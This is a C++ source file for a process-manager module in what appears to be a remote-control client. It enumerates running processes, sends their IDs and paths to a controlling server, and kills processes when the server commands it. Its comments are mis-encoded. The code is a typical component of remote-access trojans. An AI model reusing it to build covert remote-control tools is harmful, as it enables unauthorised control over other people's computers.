#include "ClientProcessManager.h"

CClientProcessManager::CClientProcessManager(_CIOCPClient* ClientObject):CManager(ClientObject)
{
	printf("���̹��캯��\r\n");
	m_ProcessModuleBase = LoadLibrary("Process.dll");
	EnableSeDebugPrivilege("SeShutdownPrivilege", TRUE);// �ػ�Ȩ��
	if (m_ProcessModuleBase == NULL)
	{

	}

	m_SeEnumProcessList = (LPFN_SEENUMPROCESSLIST)GetProcAddress(m_ProcessModuleBase, "SeEnumProcessList");
	m_Ring3KillProcess = (f4)GetProcAddress(m_ProcessModuleBase, "Ring3KillProcess");


	if (m_SeEnumProcessList == NULL || m_Ring3KillProcess == NULL)
	{
		return;
	}
	SendClientProcessList();

}

//��������
CClientProcessManager::~CClientProcessManager()
{
	printf("������������\r\n");
	EnableSeDebugPrivilege("SeShutdownPrivilege", FALSE);
	if (m_ProcessModuleBase != NULL)
	{
		FreeLibrary(m_ProcessModuleBase);
		m_ProcessModuleBase = NULL;
	}
}

void CClientProcessManager::HandleIO(PBYTE BufferData, ULONG_PTR BufferLength)
{
	switch (BufferData[0])
	{
	case CLIENT_PROCESS_REFRESH_REQUIRE:
	{
		SendClientProcessList();
		break;
	}
	case CLIENT_PROCESS_RING3_KILL_REQUIRE:
	{
		m_Ring3KillProcess((PULONG)((LPBYTE)BufferData + 1), (BufferLength - 1) / sizeof(ULONG));


		BYTE IsToken = CLIENT_PROCESS_KILL_REPLY;   //�򱻿ض˷���һ��COMMAND_SYSTEM
		m_ClientObject->OnServerSending((char*)&IsToken, sizeof(BYTE));

		break;
	}
	default:
		break;
	}
}



BOOL CClientProcessManager::SendClientProcessList()
{
	BOOL  IsOk = FALSE;
	DWORD Offset = 1;
	DWORD v7 = 0;
	ULONG ItemCount = 0;
	char* BufferData = NULL;
	vector<_PROCESS_INFORMATION_> ProcessInfo;  //������Ϣ
	vector<_PROCESS_INFORMATION_>::iterator i;  //������Ϣ������
	if (m_SeEnumProcessList == NULL)
	{
		return IsOk;
	}
	ItemCount = m_SeEnumProcessList(ProcessInfo); //ö��
	if (ItemCount == 0)
	{
		return IsOk;
	}
	BufferData = (char*)LocalAlloc(LPTR, 0x1000);
	if (BufferData == NULL)
	{
		goto Exit;
	}
	BufferData[0] = CLIENT_PROCESS_MANAGER_REPLY; //�����������
	for (i = ProcessInfo.begin(); i != ProcessInfo.end(); i++)
	{
		v7 = sizeof(DWORD) +
			lstrlen(i->ImageNameData) + lstrlen(i->ProcessFullPathData) + 2;
		// ������̫С�������·�����
		if (LocalSize(BufferData) < (Offset + v7))
		{
			BufferData = (char*)LocalReAlloc(BufferData, (Offset + v7),
				LMEM_ZEROINIT | LMEM_MOVEABLE);
		}
		//����������memcpy�����򻺳����������� ���ݽṹ�� 
		//����ID+������+0+����������+0  ����
		//��Ϊ�ַ���������0 ��β��                                             
		memcpy(BufferData + Offset, &(i->ProcessID), sizeof(ULONG32));
		Offset += sizeof(ULONG32);
		memcpy(BufferData + Offset, i->ImageNameData, lstrlen(i->ImageNameData) + 1);
		Offset += lstrlen(i->ImageNameData) + 1;
		memcpy(BufferData + Offset, i->ProcessFullPathData, lstrlen(i->ProcessFullPathData) + 1);
		Offset += lstrlen(i->ProcessFullPathData) + 1;
	}
	m_ClientObject->OnServerSending((char*)BufferData, LocalSize(BufferData));
	IsOk = TRUE;
Exit:
	if (BufferData != NULL)
	{
		LocalFree(BufferData);
		BufferData = NULL;
	}
	return IsOk;
}




